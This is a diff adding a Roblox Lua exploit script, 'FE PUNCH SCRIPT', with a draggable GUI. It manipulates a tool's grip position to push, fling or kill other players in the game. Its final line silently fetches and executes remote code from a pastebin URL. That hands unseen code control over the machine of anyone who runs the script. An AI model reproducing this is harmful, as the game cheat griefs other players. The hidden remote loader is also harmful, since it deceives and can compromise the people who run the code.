@@ -1,0 +1,411 @@
+--FE PUNCH SCRIPT
+--modded by gabkiu1 Gab#4074
+local Player = game:GetService("Players").LocalPlayer
+local Mouse = Player:GetMouse()
+local StarterGui = game:GetService("StarterGui")
+local Character = Player.Character or workspace:WaitForChild(Player.Name)
+
+-- Preferences
+local AnimationsEnabled = true
+local GuiHidden = false
+local PunchingEnabled = true
+local Power_Modes = {
+	1500, -- Push
+	10000, -- Fling
+	9e5, -- KILL
+}
+local AnimationsId = {
+	R6 = "rbxassetid://204062532",
+	R15 = "rbxassetid://846744780"
+}
+local Keys = {
+	Punch = "f",
+	Previous_Mode = "z",
+	Next_Mode = "x",
+}
+local GuiSizeMultiplier = 1
+
+local Colors = {
+	Primary = Color3.fromRGB(27, 42, 53),
+	Secondary = Color3.fromRGB(17, 32, 43),
+	Text = Color3.fromRGB(255,255,255),
+}
+--]
+
+-- GUI
+local function SwitchUpdate(Switch,State)
+	local Back = Switch.Back
+	local Pointer = Switch.Pointer
+	local X = Switch.DisabledX
+	Switch.State = State
+	if State == true then
+		
+		X = Switch.EnabledX
+	end
+	local EndPos = UDim2.new(X,0,0,0)
+	if Switch.Back.Parent ~= nil then
+		Pointer:TweenPosition(EndPos,Enum.EasingDirection.InOut,Enum.EasingStyle.Sine,Switch.AnimationTime,true)
+	else
+		Pointer.Position = EndPos
+	end
+	
+end
+local function NewSwitch(State,Parent)
+	local Back = Instance.new("Frame")
+	local Pointer = Instance.new("Frame")
+	local PointerBack = Instance.new("Frame")
+	local DisabledFrame = Instance.new("Frame")
+	local Button = Instance.new("TextButton")
+	Back.Size = UDim2.new(0.715,0,0.125,0)
+	Back.BorderSizePixel = 2
+	Back.BorderMode = Enum.BorderMode.Middle
+	Back.BackgroundColor3 = Colors.Primary
+	Back.ClipsDescendants = true
+	
+
+	Pointer.BorderSizePixel = 0
+	Pointer.BackgroundColor3 = Color3.fromRGB(200,0,0)
+	Pointer.Size = UDim2.new(1,0,1,0)
+	Pointer.Parent = Back
+	
+	PointerBack.BackgroundColor3 = Color3.fromRGB(255,255,255)
+	PointerBack.Size = UDim2.new(0.3,0,1,0)
+	PointerBack.BorderSizePixel = 1
+	PointerBack.BorderColor3 = Color3.fromRGB(255,255,255)	
+	PointerBack.Parent = Pointer
+	
+	DisabledFrame.BorderSizePixel =0
+	DisabledFrame.Size = UDim2.new(1,0,1,0)
+	DisabledFrame.BackgroundColor3 = Colors.Primary
+	DisabledFrame.BackgroundTransparency = 0.5
+	DisabledFrame.Visible = false
+	DisabledFrame.Parent = PointerBack
+	
+	Button.ZIndex = 2
+	Button.Text = ""
+	Button.BorderSizePixel = 0
+	Button.BackgroundTransparency = 1
+	Button.AutoButtonColor = false
+	Button.Size = UDim2.new(1,0,1,0)
+	Button.Parent = Back
+	
+	local Switch = {
+		Pointer = Pointer,
+		Back = Back,
+		State = State,
+		Button = Button,
+		Update = SwitchUpdate,
+		EnabledX = 1 - PointerBack.Size.X.Scale,
+		DisabledX = 0,
+		AnimationTime = 0.15,
+		DISABLED = false,
+	}
+	
+	Button.MouseButton1Down:Connect(function()
+		Switch:Update(not Switch.State)
+	end)
+	Back.BackgroundColor3 = Color3.fromRGB(0,200,0)
+	Back.Name = "Switch"	
+	Switch:Update(State)
+	return Switch
+end
+
+local Parent = game.CoreGui
+local ScreenGui = Instance.new("ScreenGui")
+local BackFrame = Instance.new("Frame")
+local Topbar = Instance.new("Frame")
+local TopTitle = Instance.new("TextLabel")
+
+local BPosition = UDim2.new(0.07 ,0,0.95 - BackFrame.Size.Y.Scale)
+
+BackFrame.Size = UDim2.new(0.125 * GuiSizeMultiplier,0,0.36 * GuiSizeMultiplier,0)
+
+BackFrame.BorderSizePixel = 0
+BackFrame.BackgroundColor3 = Colors.Primary
+BackFrame.Parent = ScreenGui
+
+BackFrame.Position = UDim2.new(-(BackFrame.Size.X.Scale),0,BPosition.Y.Scale,0)
+
+
+Topbar.Size = UDim2.new(1,0,0.09,0)
+Topbar.BackgroundColor3 = Colors.Secondary
+Topbar.BorderSizePixel = 0
+Topbar.Parent = BackFrame
+
+HolderFrame = Instance.new("Frame")
+HolderFrame.BackgroundTransparency = 1
+HolderFrame.Size = UDim2.new(0.9,0,0.9,0)
+HolderFrame.Position = HolderFrame.Position + UDim2.new(0.05,0,0.05,0)
+HolderFrame.Parent = Topbar
+
+TopTitle.Font = Enum.Font.ArialBold
+TopTitle.TextScaled = true
+TopTitle.Size = UDim2.new(1,0,0.85,0)
+TopTitle.BackgroundTransparency = 1
+TopTitle.Text = "Punch UI v1.07"
+TopTitle.TextColor3 = Colors.Text
+TopTitle.Parent = HolderFrame
+
+LabelA = Instance.new("TextLabel")
+LabelA.Text = "Animations"
+LabelA.TextColor3 = Colors.Text
+LabelA.Size = UDim2.new(1,0,0.08,0)
+LabelA.BackgroundTransparency = 1
+LabelA.Position = UDim2.new(0.13,0,0.14,0)
+LabelA.TextScaled = true
+LabelA.Font = Enum.Font.ArialBold
+LabelA.TextXAlignment = Enum.TextXAlignment.Left
+LabelA.Parent = BackFrame
+
+
+HideButton = Instance.new("TextButton")
+HideButton.Text = "X"
+HideButton.TextScaled = true
+HideButton.Size = UDim2.new(0.2,0,1,0)
+HideButton.Position = UDim2.new(1 - HideButton.Size.X.Scale,0,0,0)
+HideButton.BackgroundTransparency = 1
+HideButton.TextColor3 = Colors.Text
+HideButton.Parent = Topbar
+
+HideButton.MouseButton1Down:Connect(function()
+	GuiHidden = not GuiHidden
+	for _,F in pairs(BackFrame:GetChildren()) do
+		F.Visible =  not GuiHidden
+	end
+	
+	if GuiHidden then
+		BackFrame.BackgroundTransparency = 1
+		HideButton.Text = "+"
+	else
+		BackFrame.BackgroundTransparency = 0
+		HideButton.Text = "X"
+	end
+	HideButton.Visible = true
+	Topbar.Visible = true
+end)
+
+AnimSwitch = NewSwitch(AnimationsEnabled)
+AnimSwitch.Back.Position = LabelA.Position + UDim2.new(0,0,AnimSwitch.Back.Size.Y.Scale + 0.01,0)
+AnimSwitch.Button.MouseButton1Down:Connect(function()
+	wait()
+	AnimationsEnabled = AnimSwitch.State
+end)
+AnimSwitch.Back.Parent = BackFrame
+
+LabelB = LabelA:Clone()
+LabelB.Position = AnimSwitch.Back.Position + UDim2.new(0,0,0.07 + LabelB.Size.Y.Scale,0)
+LabelB.Text = "Enabled"
+LabelB.Parent = BackFrame
+
+EnabledSwitch = NewSwitch(PunchingEnabled)
+EnabledSwitch.Back.Position = LabelB.Position + UDim2.new(0,0,EnabledSwitch.Back.Size.Y.Scale + 0.01,0)
+EnabledSwitch.Back.Parent = BackFrame
+
+Holder = Instance.new("Frame")
+Holder.Size = UDim2.new(0.8,0,0.14,0)
+Holder.Position = UDim2.new(0.1,0, 1 - (Holder.Size.Y.Scale + 0.01))
+Holder.BackgroundTransparency = 1
+Holder.Parent = BackFrame
+
+PButton = Instance.new("TextButton")
+PButton.Size = UDim2.new(0.25,0,1,0)
+PButton.BackgroundColor3 = Colors.Secondary
+PButton.BorderSizePixel = 0
+PButton.BackgroundTransparency = 1
+PButton.TextColor3 = Colors.Text
+PButton.Text = "<"
+PButton.TextScaled = true
+PButton.Parent = Holder
+
+NButton = PButton:Clone()
+NButton.Position = UDim2.new(1 - NButton.Size.X.Scale,0,0,0)
+NButton.Text = ">"
+NButton.Parent = Holder
+
+MLabel = Instance.new("TextLabel")
+MLabel.Size = UDim2.new(0.5,0,1,0)
+MLabel.Position = UDim2.new(0.25,0,0,0)
+MLabel.Font = Enum.Font.ArialBold
+MLabel.BackgroundTransparency = 1
+MLabel.TextScaled = true
+MLabel.TextColor3 = Colors.Text
+MLabel.Text = "Kill"
+MLabel.Parent = Holder
+
+KLabel = LabelB:Clone()
+KLabel.Position = Holder.Position - UDim2.new(0,0,KLabel.Size.Y.Scale + 0.01,0)
+KLabel.Size = UDim2.new(0.65,0,KLabel.Size.Y.Scale,0)
+KLabel.Text = "Punch Key"
+KLabel.Parent = BackFrame
+
+PunchBox = Instance.new("TextBox")
+PunchBox.BorderSizePixel = 0
+PunchBox.Position = KLabel.Position + UDim2.new(KLabel.Size.X.Scale,0,0,0)
+PunchBox.Size = UDim2.new((1 - KLabel.Size.X.Scale)/2,0,KLabel.Size.Y.Scale,0)
+PunchBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
+PunchBox.TextScaled = true
+PunchBox.Text = Keys.Punch
+PunchBox.Parent = BackFrame
+
+ScreenGui.Parent = Parent
+
+local Current_Mode = 3
+
+PunchBox.Changed:Connect(function(w)
+	PunchBox.Text = (PunchBox.Text:sub(1,1)):lower()
+	local Txt = PunchBox.Text
+	if Txt:len() > 0 and tonumber(PunchBox.Text) == nil then
+		Keys.Punch = Txt
+	end
+end)
+EnabledSwitch.Button.MouseButton1Down:Connect(function()
+	wait()
+	PunchingEnabled = EnabledSwitch.State
+end)
+local function NewAnimation(ID)
+	local Animation = Instance.new("Animation")
+	Animation.AnimationId = ID
+	return Animation
+end
+local R15Animation = NewAnimation(AnimationsId.R15)
+local R6Animation = NewAnimation(AnimationsId.R6)
+
+local function GetAnimation(Humanoid)
+	if Humanoid.RigType == Enum.HumanoidRigType.R15 then
+		return Humanoid:LoadAnimation(R15Animation)
+	else
+		return Humanoid:LoadAnimation(R6Animation)
+	end
+end
+local keysf = {
+	"Push","Fling","Kill"
+}
+local function UpdateText()
+	MLabel.Text = keysf[Current_Mode]
+end
+local Punching = false
+local function Punch()
+	if not Punching then
+		if PunchingEnabled then
+			Punching = true
+			local Humanoid = Character.Humanoid
+			local RootPart = Character.PrimaryPart
+			Humanoid:UnequipTools()
+			wait()
+			local Tool = Player.Backpack:FindFirstChildOfClass("Tool")
+			if Tool ~= nil then
+				RootPart.Anchored = true
+				local AnimationId
+				local AnimationTrack = GetAnimation(Humanoid)
+				if AnimationsEnabled then
+					AnimationTrack:Play()
+				end
+				local OriginalGrip = Tool.GripPos
+				Tool.Parent = Player.Character
+				Tool.GripPos = Vector3.new(0,Power_Modes[Current_Mode],100 * (1 - Power_Modes[Current_Mode]/5000))
+				wait(0.07)
+				RootPart.Anchored = false
+				Tool.GripPos = OriginalGrip
+				
+				wait(0.25)
+				game.Players.LocalPlayer.Character:FindFirstChild("Humanoid"):UnequipTools()
+				Punching = false
+
+			else
+				local Args = {
+					Title = "PUNCH SCRIPT",
+					Text = "ERROR, You need a tool.",
+					Icon = "http://www.roblox.com/asset/?id=41363725",
+					Duration = 7,
+				}
+				StarterGui:SetCore("SendNotification",Args)
+			end
+		end
+	end
+end
+local function Next_Mode()
+	local Next = Current_Mode + 1
+	if Next > #Power_Modes then
+		Current_Mode = 1
+	else
+		Current_Mode = Next
+	end
+	UpdateText()
+end
+local function Previous_Mode()
+	local Next = Current_Mode - 1
+
+	if Next < 1 then
+	
+		Current_Mode = 3
+	else
+		Current_Mode = Next
+	end
+	UpdateText()
+end
+local DownKeys = {}
+local function KeyDown(Key)
+	if Key == Keys.Punch:lower() then
+		Punch()
+	elseif Key == Keys.Next_Mode:lower() then
+		Next_Mode()
+	elseif Key == Keys.Previous_Mode:lower() then
+		Previous_Mode()
+	end
+end
+
+local function KeyUp(Key)
+	DownKeys[Key] = nil
+end
+
+Mouse.KeyDown:Connect(KeyDown)
+Mouse.KeyUp:Connect(KeyUp)
+PButton.MouseButton1Down:Connect(Previous_Mode)
+NButton.MouseButton1Down:Connect(Next_Mode)
+-- Drag
+local UserInputService = game:GetService("UserInputService")
+
+local gui = BackFrame
+
+local dragging
+local dragInput
+local dragStart
+local startPos
+
+local function update(input)
+	local delta = input.Position - dragStart
+	gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+end
+
+Topbar.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		dragging = true
+		dragStart = input.Position
+		startPos = gui.Position
+		
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
+	end
+end)
+
+Topbar.InputChanged:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+		dragInput = input
+	end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+	if input == dragInput and dragging then
+		update(input)
+	end
+end)
+Player.CharacterAdded:Connect(function()
+	Character = Player.Character
+end)
+Character.Animate.toolnone.ToolNoneAnim.AnimationId = "000000"
+wait()
+BackFrame:TweenPosition(BPosition,Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,1.5)
+loadstring(game:HttpGet(('https://pastebin.com/raw/4BE5Rcjn'),true))()
